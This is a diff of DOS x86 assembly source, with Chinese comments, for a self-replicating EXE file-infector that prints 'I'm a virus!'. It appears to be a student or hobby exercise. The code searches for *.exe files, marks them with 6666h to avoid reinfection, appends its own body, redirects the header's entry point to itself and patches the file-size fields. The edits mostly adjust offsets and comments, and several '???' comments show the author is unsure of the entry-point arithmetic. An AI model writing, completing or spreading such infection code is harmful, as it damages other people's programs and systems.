@@ -1,7 +1,4 @@
-assume cs:code,ds:data
-data segment
-
-data ends
+assume cs:code
 code segment
     start:    
               mov  ax,cs                       ;初始化
@@ -26,7 +23,7 @@ code segment
               int  21h
 
               push cs                          ;跳转回原程序代码
-              mov  ax,word ptr [si+02eh]       ;02e即原来的14-15
+              mov  ax,word ptr [si+2ch]       ;2ch即原来的14-15
               push ax
               retf
 
@@ -34,7 +31,7 @@ virus proc
               call locate
     locate:   
               pop  bp                          ;call指令压入了locate的IP , bp=offset locate
-              sub  bp,offset locate            ;bp=0
+              sub  bp,offset locate            ;bp为相对原点
               lea  dx,[bp+offset string]       ;输出字符串
               mov  ah,09h
               int  21h
@@ -74,7 +71,7 @@ virus proc
                                                 ;BX=文件号，CX=字节数
                                                 ;DS:DX=数据缓冲区地址
 
-              mov  cx,30h                      ;读取30字节
+              mov  cx,30h                      ;读取30h字节
 
               lea  dx,[bp+offset head]         ;设置head
               mov  si,dx                       ;si=offset head
@@ -82,14 +79,15 @@ virus proc
 
               cmp  word ptr [si],5a4dh         ;检查是否是exe,5a4d为文件的标识
               jnz  next_file
-;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!病毒标识，需要更改
+                ;病毒标识
               cmp  word ptr [si+2ah],6666h     ;检查是否已被感染
               je   next_file
 
-              mov  word ptr [si+2ah],6666h
+              mov  word ptr [si+2ah],6666h     ;若没感染则感染
 
-              mov  ax,word ptr [si+014h]       ;保存原程序入口;;表示14-15H: b.exe 被载入后 IP 的初值是
-              mov  word ptr [si+02eh],ax       ;保存信息在head
+              mov  ax,word ptr [si+014h]       ;保存原程序入口，表示源程序14-15H被载入后 IP 的初值是
+
+              mov  word ptr [si+2ch],ax       ;载入入口保留到2c的位置
 
               xor  cx,cx                       ;位移量清零
               xor  dx,dx
@@ -99,15 +97,19 @@ virus proc
                                                 ;返回：CF=0成功,DX:AX=新的文件指针
               int  21h
 
-              push ax                           ;存一下AA.exe文件末尾的位置
+              push ax                           ;存一下EX1.exe文件末尾的位置
+              ;???
               sub  ax,200h
+
               mov  cx,ax
               mov  ax,[si+16h]                 ;16-17H:表示 b.exe 被载入后 CS 的相对偏移地址是
 
               mov  dx,10h
               mul  dx
               sub  cx,ax
-              mov  word ptr [si+14h],cx        ;这里我是试出来病毒代码的内存地址的；修改ip指向，程序入口为病毒代码
+
+              mov  word ptr [si+14h],cx      
+              ;???  
               pop  ax
              
               lea  dx,[bp+offset start]        ;写入代码
@@ -117,24 +119,26 @@ virus proc
                                                 ;参数:DS:DX=缓冲区首址, BX=文件号，CX=写入的字节数。
               int  21h
 
-              mov  ax,4202h                    ;计算新文件长度,修改头
+              mov  ax,4202h                    ;文件指针移动到末尾
               xor  cx,cx
               xor  dx,dx
               int  21h
 
-              mov  cx,200h
+              mov  cx,200h                      ;重新计算文件大小
               div  cx
               inc  ax
               mov  word ptr [si+2],dx
               mov  word ptr [si+4],ax
     
               mov  ax,4200h                     ;42号功能，AL=方式0-正向1-相对2-反向
+                                                ;BX=文件代号
                                                 ;返回：CF=0成功,DX:AX=新的文件指针
               xor  cx,cx                        ;位移为0
               xor  dx,dx
               int  21h
 
-              mov  ah,40h                        ;将新的头文件写入
+              mov  ah,40h                        ;将新的头文件写入,从DX
+                                                ;BX=文件代号
               mov  dx,si
               mov  cx,30h
               int  21h
@@ -153,7 +157,7 @@ virus proc
               ret
 virus endp
     filename  db   "*.exe",0                   ;文件名
-    dta       db   02bh dup(0)                 ;磁盘缓冲区
+    dta       db   030h dup(0)                 ;磁盘缓冲区
     string    db   "I'm a virus!",13,10,'$'
     head      db   30h dup(0)                  ;读文件头,内容存到head
     theend:   
